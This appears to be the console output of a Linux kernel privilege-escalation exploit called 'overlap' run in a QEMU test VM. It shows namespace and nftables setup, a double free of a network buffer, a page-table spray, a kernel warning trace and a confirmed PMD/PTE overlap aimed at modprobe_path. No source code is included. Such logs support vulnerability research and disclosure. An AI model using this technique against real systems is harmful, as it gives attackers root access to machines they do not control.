test@syzkaller:~$ ./overlap
[+] creating user namespace (CLONE_NEWUSER)...
[+] creating network namesapce (CLONE_NEWNET)...
[+] setting up UID namespace...
[+] mapping uid 1000 to namespace uid 0...
[+] deny namespace rights to set user groups...
[+] mapping gid 1000 to namespace gid 0...
[+] configuring localhost in namespace...
[+] disbaling RPF in network namespace...
[+] disabling rpf for interface: 'lo'
[+] disabling rpf for interface: 'sit0'
[+] setting up nftables...
[+] allocating netfilter objects...
[+] sending nftables tables/chains/rules/expr using netlink...
[+] running normal privesc
[+] doing first useless allocs to setup caching and stuff..
[+] allocated VMAs for process:
  - pte_area: ?
  - _pmd_area: 0x80000000
  - modprobe_path: '/sbin/modprobe' @ 0x7ffdccdd4f70
[+] sending intermediate buffer packet...
[+] sending IP packet (32796 bytes)...
[+] waiting for the clam before the storm...
[+] start to reserve udp packets 170
[+] sending double free buffer packet...
[+] sending IP packet (32796 bytes)...
[+] start to free reserved udp packets to mask corrupted packet 170
[+] spraying 16000 pte's...
[+] double-freeing skb...
[+] sending intermediate buffer packet...
[+] sending IP packet (20 bytes)...
[  210.943639] ------------[ cut here ]------------
[  210.943986] WARNING: CPU: 0 PID: 442 at mm/slab_common.c:935 free_large_kmalloc+0x5e/0x90
[  210.944460] Modules linked in:
[  210.944746] CPU: 0 PID: 442 Comm: overlap Not tainted 6.3.0-00001-ge449dbb06b7b #31
[  210.945179] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  210.945498] RIP: 0010:free_large_kmalloc+0x5e/0x90
[  210.945740] Code: 45 00 be 06 00 00 00 48 c1 e8 3a 48 8b 3c c5 e0 cf c9 82 e8 64 5e ff ff 44 89 e6 48 89 ef 48 83 c4 08 5d 41 5c e9 12 44 03 00 <0f> 0b 45 31 e4 80 3d a7 0c a7 01 00 48 c78
[  210.946324] RSP: 0018:ffff88813bc05d20 EFLAGS: 00000246
[  210.946552] RAX: 0200000000000000 RBX: 0000000000000000 RCX: 0000000000000000
[  210.946728] RDX: 0000000000000000 RSI: ffff88810fcc0000 RDI: ffffea00043f3000
[  210.947090] RBP: ffffea00043f3000 R08: ffff88810fc9bb58 R09: 0000000000000001
[  210.947327] R10: ffff888101816290 R11: ffff88813bc2b270 R12: 0000000000000002
[  210.947733] R13: ffff88810fc9fd00 R14: ffff88810fc9bb58 R15: 0000000000000014
[  210.948141] FS:  00007f766bc48740(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[  210.948335] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  210.948529] CR2: 00000087cfe00000 CR3: 0000000107092000 CR4: 00000000000006f0
[  210.948764] Call Trace:
[  210.949712]  <IRQ>
[  210.950255]  skb_release_data+0xea/0x1c0
[  210.950532]  kfree_skb_reason+0x4b/0x110
[  210.950653]  inet_frag_rbtree_purge+0x4f/0x80
[  210.950982]  inet_frag_destroy+0x49/0x80
[  210.951166]  ip_defrag+0x4ce/0x840
[  210.951284]  ip_local_deliver+0x50/0x120
[  210.951422]  ? ip_rcv+0xd7/0x170
[  210.951507]  __netif_receive_skb_one_core+0x86/0xa0
[  210.951703]  process_backlog+0x98/0x140
[  210.957640]  __napi_poll+0x27/0x1b0
[  210.957754]  net_rx_action+0x28a/0x2e0
[  210.957853]  __do_softirq+0xc0/0x290
[  210.958154]  do_softirq+0x62/0x90
[  210.958497]  </IRQ>
[  210.958604]  <TASK>
[  210.958678]  __local_bh_enable_ip+0x59/0x70
[  210.959066]  ip_finish_output2+0x182/0x500
[  210.959231]  ? __pfx_ip_finish_output+0x10/0x10
[  210.959396]  raw_sendmsg+0xccb/0xce0
[  210.959609]  ? common_interrupt+0x13/0xa0
[  210.959767]  ? __pfx_dst_output+0x10/0x10
[  210.960017]  ? sock_sendmsg+0x8a/0xa0
[  210.960174]  ? __pfx_raw_sendmsg+0x10/0x10
[  210.960282]  sock_sendmsg+0x8a/0xa0
[  210.960495]  ? move_addr_to_kernel.part.0+0x16/0x60
[  210.960623]  __sys_sendto+0xfb/0x170
[  210.960722]  ? vfs_write+0x1a8/0x3a0
[  210.961003]  __x64_sys_sendto+0x1f/0x30
[  210.961127]  do_syscall_64+0x3f/0x90
[  210.961262]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
[  210.961631] RIP: 0033:0x7f766bd48046
[  210.962069] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec9
[  210.962600] RSP: 002b:00007ffdccdd4e68 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  210.962847] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f766bd48046
[  210.963135] RDX: 0000000000000014 RSI: 000055cb45c2a2e0 RDI: 0000000000000005
[  210.963389] RBP: 00007ffdccdd4e90 R08: 00007ffdccdd4ec0 R09: 0000000000000010
[  210.963592] R10: 0000000000000000 R11: 0000000000000246 R12: 000055cb45c24540
[  210.963759] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  210.964240]  </TASK>
[  210.964414] ---[ end trace 0000000000000000 ]---
[  210.964671] object pointer: 0x00000000fa4fd13f
[+] checking 16000 sprayed pte's for overlap...
[+] confirmed double alloc PMD/PTE
    - PTE area index: 18
    - PTE area (write target address/page: 8000000122d5a067 (new)
[+] done